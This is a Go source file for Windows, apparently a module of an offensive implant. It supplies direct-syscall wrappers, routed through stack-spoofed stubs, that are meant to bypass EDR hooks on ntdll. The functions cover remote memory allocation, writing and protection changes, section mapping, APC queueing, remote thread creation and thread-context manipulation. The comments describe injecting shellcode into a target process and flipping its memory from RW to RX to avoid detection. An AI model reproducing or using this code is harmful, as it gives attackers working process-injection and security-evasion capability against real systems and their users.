//go:build windows
// +build windows

package evasion

import (
	"sync"
	"unsafe"
)

// NT system-call helpers — all routed through HGProc (direct syscall + stack
// spoof) so that EDR user-mode hooks on ntdll stubs never intercept them.
// This also breaks the circular dependency that existed when unhookNtdll()
// called ntProtect through a potentially-hooked LazyProc before cleaning ntdll.

const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1

const (
	sectionAllAccess uintptr = 0xF001F    // SECTION_ALL_ACCESS
	secCommit        uintptr = 0x8000000  // SEC_COMMIT
	viewUnmap        uintptr = 2          // SECTION_INHERIT: ViewUnmap
)

var (
	hgNtReadVirtualMemoryOnce sync.Once
	hgNtReadVirtualMemoryProc *HGProc

	hgNtQueryProcessOnce sync.Once
	hgNtQueryProcessProc *HGProc

	hgNtResumeThreadOnce sync.Once
	hgNtResumeThreadProc *HGProc

	hgNtProtectOnce sync.Once
	hgNtProtectProc *HGProc

	hgNtWriteOnce sync.Once
	hgNtWriteProc *HGProc

	hgNtFlushOnce sync.Once
	hgNtFlushProc *HGProc

	hgNtSetInfoOnce sync.Once
	hgNtSetInfoProc *HGProc

	hgNtAllocOnce sync.Once
	hgNtAllocProc *HGProc

	hgNtCreateThreadOnce sync.Once
	hgNtCreateThreadProc *HGProc

	hgNtCreateSectionOnce sync.Once
	hgNtCreateSectionProc *HGProc

	hgNtMapViewOnce sync.Once
	hgNtMapViewProc *HGProc

	hgNtUnmapViewOnce sync.Once
	hgNtUnmapViewProc *HGProc

	hgNtQueueApcOnce sync.Once
	hgNtQueueApcProc *HGProc

	hgNtGetNextThreadOnce sync.Once
	hgNtGetNextThreadProc *HGProc

	hgNtGetNextProcessOnce sync.Once
	hgNtGetNextProcessProc *HGProc

	hgNtSuspendThreadOnce sync.Once
	hgNtSuspendThreadProc *HGProc

	hgNtGetContextThreadOnce sync.Once
	hgNtGetContextThreadProc *HGProc

	hgNtSetContextThreadOnce sync.Once
	hgNtSetContextThreadProc *HGProc
)

func getNtReadVirtualMemoryProc() *HGProc {
	hgNtReadVirtualMemoryOnce.Do(func() {
		hgNtReadVirtualMemoryProc = NewHGProc("NtReadVirtualMemory")
	})
	return hgNtReadVirtualMemoryProc
}

func getNtQueryProcessProc() *HGProc {
	hgNtQueryProcessOnce.Do(func() {
		hgNtQueryProcessProc = NewHGProc("NtQueryInformationProcess")
	})
	return hgNtQueryProcessProc
}

func getNtResumeThreadProc() *HGProc {
	hgNtResumeThreadOnce.Do(func() {
		hgNtResumeThreadProc = NewHGProc(sNtResumeThread())
	})
	return hgNtResumeThreadProc
}

func getNtProtectProc() *HGProc {
	hgNtProtectOnce.Do(func() {
		hgNtProtectProc = NewHGProc("NtProtectVirtualMemory")
	})
	return hgNtProtectProc
}

func getNtWriteProc() *HGProc {
	hgNtWriteOnce.Do(func() {
		hgNtWriteProc = NewHGProc("NtWriteVirtualMemory")
	})
	return hgNtWriteProc
}

func getNtFlushProc() *HGProc {
	hgNtFlushOnce.Do(func() {
		hgNtFlushProc = NewHGProc("NtFlushInstructionCache")
	})
	return hgNtFlushProc
}

func getNtSetInfoProc() *HGProc {
	hgNtSetInfoOnce.Do(func() {
		hgNtSetInfoProc = NewHGProc("NtSetInformationProcess")
	})
	return hgNtSetInfoProc
}

func getNtAllocProc() *HGProc {
	hgNtAllocOnce.Do(func() {
		hgNtAllocProc = NewHGProc("NtAllocateVirtualMemory")
	})
	return hgNtAllocProc
}

func getNtCreateThreadProc() *HGProc {
	hgNtCreateThreadOnce.Do(func() {
		hgNtCreateThreadProc = NewHGProc("NtCreateThreadEx")
	})
	return hgNtCreateThreadProc
}

func getNtCreateSectionProc() *HGProc {
	hgNtCreateSectionOnce.Do(func() {
		hgNtCreateSectionProc = NewHGProc(sNtCreateSection())
	})
	return hgNtCreateSectionProc
}

func getNtMapViewProc() *HGProc {
	hgNtMapViewOnce.Do(func() {
		hgNtMapViewProc = NewHGProc(sNtMapViewOfSection())
	})
	return hgNtMapViewProc
}

func getNtUnmapViewProc() *HGProc {
	hgNtUnmapViewOnce.Do(func() {
		hgNtUnmapViewProc = NewHGProc(sNtUnmapViewOfSection())
	})
	return hgNtUnmapViewProc
}

func getNtQueueApcProc() *HGProc {
	hgNtQueueApcOnce.Do(func() {
		hgNtQueueApcProc = NewHGProc(sNtQueueApcThread())
	})
	return hgNtQueueApcProc
}

func getNtGetNextThreadProc() *HGProc {
	hgNtGetNextThreadOnce.Do(func() {
		hgNtGetNextThreadProc = NewHGProc(sNtGetNextThread())
	})
	return hgNtGetNextThreadProc
}

func getNtGetNextProcessProc() *HGProc {
	hgNtGetNextProcessOnce.Do(func() {
		hgNtGetNextProcessProc = NewHGProc(sNtGetNextProcess())
	})
	return hgNtGetNextProcessProc
}

func getNtSuspendThreadProc() *HGProc {
	hgNtSuspendThreadOnce.Do(func() {
		hgNtSuspendThreadProc = NewHGProc(sNtSuspendThread())
	})
	return hgNtSuspendThreadProc
}

func getNtGetContextThreadProc() *HGProc {
	hgNtGetContextThreadOnce.Do(func() {
		hgNtGetContextThreadProc = NewHGProc(sNtGetContextThread())
	})
	return hgNtGetContextThreadProc
}

func getNtSetContextThreadProc() *HGProc {
	hgNtSetContextThreadOnce.Do(func() {
		hgNtSetContextThreadProc = NewHGProc(sNtSetContextThread())
	})
	return hgNtSetContextThreadProc
}

// NtAllocateVirtualMemory allocates virtual memory in a process without going
// through kernel32!VirtualAllocEx (bypasses EDR hooks on the Win32 layer).
//   processHandle: target process (windows.CurrentProcess() for self)
//   size:          bytes to allocate (rounded up to page boundary by kernel)
//   protect:       page protection (e.g. windows.PAGE_EXECUTE_READ)
//
// Returns the allocated base address or 0 on failure.
func NtAllocateVirtualMemory(processHandle uintptr, size uintptr, protect uint32) uintptr {
	p := getNtAllocProc()
	if p == nil {
		return 0
	}
	var base uintptr
	const memCommitReserve = 0x3000
	r, _, _ := p.Call(
		processHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&size)),
		memCommitReserve,
		uintptr(protect),
	)
	if r != 0 {
		return 0
	}
	return base
}

// NtCreateThreadEx starts a thread in the target process at startAddress via
// a direct NtCreateThreadEx syscall stub (bypasses EDR hooks on ntdll dispatch).
// Returns the thread handle or 0 on failure.
func NtCreateThreadEx(processHandle uintptr, startAddress uintptr) uintptr {
	p := getNtCreateThreadProc()
	if p == nil {
		return 0
	}
	const accessAll = 0x1FFFFF
	var threadHandle uintptr
	r, _, _ := p.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		accessAll,
		0,
		processHandle,
		startAddress,
		0, 0, 0, 0, 0, 0,
	)
	if r != 0 {
		return 0
	}
	return threadHandle
}

// ntProtect changes memory protection via a direct NtProtectVirtualMemory
// syscall stub — bypasses any EDR hook on the ntdll dispatch path.
func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32, ok bool) {
	p := getNtProtectProc()
	if p == nil {
		return 0, false
	}
	baseAddr := addr
	regionSize := size
	r, _, _ := p.Call(
		ntCurrentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return oldProtect, r == 0
}

// ntWrite writes bytes directly via a direct NtWriteVirtualMemory syscall.
func ntWrite(dst uintptr, src []byte) bool {
	return NtWriteRemote(ntCurrentProcess, dst, src)
}

// NtWriteRemote writes src bytes into processHandle:dst via NtWriteVirtualMemory,
// bypassing any EDR hook on WriteProcessMemory.
func NtWriteRemote(processHandle uintptr, dst uintptr, src []byte) bool {
	p := getNtWriteProc()
	if p == nil || len(src) == 0 {
		return false
	}
	var written uintptr
	r, _, _ := p.Call(
		processHandle,
		dst,
		uintptr(unsafe.Pointer(&src[0])),
		uintptr(len(src)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r == 0
}

// NtProtectRemote changes memory protection in an arbitrary process via a
// direct NtProtectVirtualMemory syscall. Used to flip RW→RX in a target after
// writing shellcode, so the target never has an RWX allocation at rest.
func NtProtectRemote(processHandle uintptr, addr uintptr, size uintptr, newProtect uint32) bool {
	p := getNtProtectProc()
	if p == nil {
		return false
	}
	var old uint32
	r, _, _ := p.Call(
		processHandle,
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&old)),
	)
	return r == 0
}

// NtCreateSection creates a pagefile-backed memory section with the given
// maximum size and page protection.  Returns the section handle or 0 on error.
func NtCreateSection(maxSize uint64, protect uint32) uintptr {
	p := getNtCreateSectionProc()
	if p == nil {
		return 0
	}
	var hSection uintptr
	sizeVal := maxSize
	r, _, _ := p.Call(
		uintptr(unsafe.Pointer(&hSection)),
		sectionAllAccess,
		0,
		uintptr(unsafe.Pointer(&sizeVal)),
		uintptr(protect),
		secCommit,
		0,
	)
	if r != 0 {
		return 0
	}
	return hSection
}

// NtMapViewOfSection maps a view of sectionHandle into processHandle.
// baseAddr and viewSize are in/out: on success baseAddr receives the mapped
// address and viewSize receives the actual mapped size.
func NtMapViewOfSection(sectionHandle uintptr, processHandle uintptr, baseAddr *uintptr, viewSize *uintptr, protect uint32) bool {
	p := getNtMapViewProc()
	if p == nil {
		return false
	}
	r, _, _ := p.Call(
		sectionHandle,
		processHandle,
		uintptr(unsafe.Pointer(baseAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(viewSize)),
		viewUnmap,
		0,
		uintptr(protect),
	)
	return r == 0
}

// NtUnmapViewOfSection unmaps a mapped view from processHandle.
func NtUnmapViewOfSection(processHandle uintptr, baseAddr uintptr) {
	p := getNtUnmapViewProc()
	if p != nil {
		p.Call(processHandle, baseAddr)
	}
}

// NtQueueApcThread queues a user-mode APC to threadHandle pointing at
// apcRoutine with apcArg as the first argument.
func NtQueueApcThread(threadHandle uintptr, apcRoutine uintptr, apcArg uintptr) bool {
	p := getNtQueueApcProc()
	if p == nil {
		return false
	}
	r, _, _ := p.Call(threadHandle, apcRoutine, apcArg, 0, 0)
	return r == 0
}

// NtGetNextThread enumerates threads in processHandle.  Pass 0 as prevThread
// to get the first thread; pass the previous result to advance.  The caller is
// responsible for closing the returned handle.  Returns 0 when no more threads.
func NtGetNextThread(processHandle uintptr, prevThread uintptr, accessMask uint32) uintptr {
	p := getNtGetNextThreadProc()
	if p == nil {
		return 0
	}
	var newThread uintptr
	r, _, _ := p.Call(
		processHandle,
		prevThread,
		uintptr(accessMask),
		0, 0,
		uintptr(unsafe.Pointer(&newThread)),
	)
	if r != 0 {
		return 0
	}
	return newThread
}

// NtReadRemote reads from processHandle:src into dst via a direct
// NtReadVirtualMemory syscall stub (bypasses ReadProcessMemory EDR hooks).
func NtReadRemote(processHandle uintptr, src uintptr, dst []byte) bool {
	p := getNtReadVirtualMemoryProc()
	if p == nil || len(dst) == 0 {
		return false
	}
	var read uintptr
	r, _, _ := p.Call(
		processHandle,
		src,
		uintptr(unsafe.Pointer(&dst[0])),
		uintptr(len(dst)),
		uintptr(unsafe.Pointer(&read)),
	)
	return r == 0
}

// ProcessPEB returns the PEB base address of processHandle via
// NtQueryInformationProcess(ProcessBasicInformation).
//
// PROCESS_BASIC_INFORMATION layout (x64):
//
//	+0x00  ExitStatus     (NTSTATUS, 4 bytes; padded to 8 by alignment)
//	+0x08  PebBaseAddress (PPEB)
//	+0x10  AffinityMask   (ULONG_PTR)
//	+0x18  BasePriority   (LONG)
//	+0x20  UniqueProcessId
//	+0x28  InheritedFromUniqueProcessId
func ProcessPEB(processHandle uintptr) uintptr {
	p := getNtQueryProcessProc()
	if p == nil {
		return 0
	}
	var pbi [6]uintptr // 6 × 8 = 48 bytes = sizeof(PROCESS_BASIC_INFORMATION) on x64
	var retLen uint32
	r, _, _ := p.Call(
		processHandle,
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi[0])),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return 0
	}
	return pbi[1] // PebBaseAddress at offset 0x08
}

// ProcessImageBase reads PEB.ImageBaseAddress (PEB+0x10) from processHandle.
func ProcessImageBase(processHandle uintptr) uintptr {
	peb := ProcessPEB(processHandle)
	if peb == 0 {
		return 0
	}
	var buf [8]byte
	if !NtReadRemote(processHandle, peb+0x10, buf[:]) {
		return 0
	}
	var base uintptr
	for i, b := range buf {
		base |= uintptr(b) << (uint(i) * 8)
	}
	return base
}

// ntFlush flushes the CPU instruction cache after patching executable memory.
func ntFlush(addr uintptr, size uintptr) {
	p := getNtFlushProc()
	if p == nil {
		return
	}
	p.Call(ntCurrentProcess, addr, size)
}
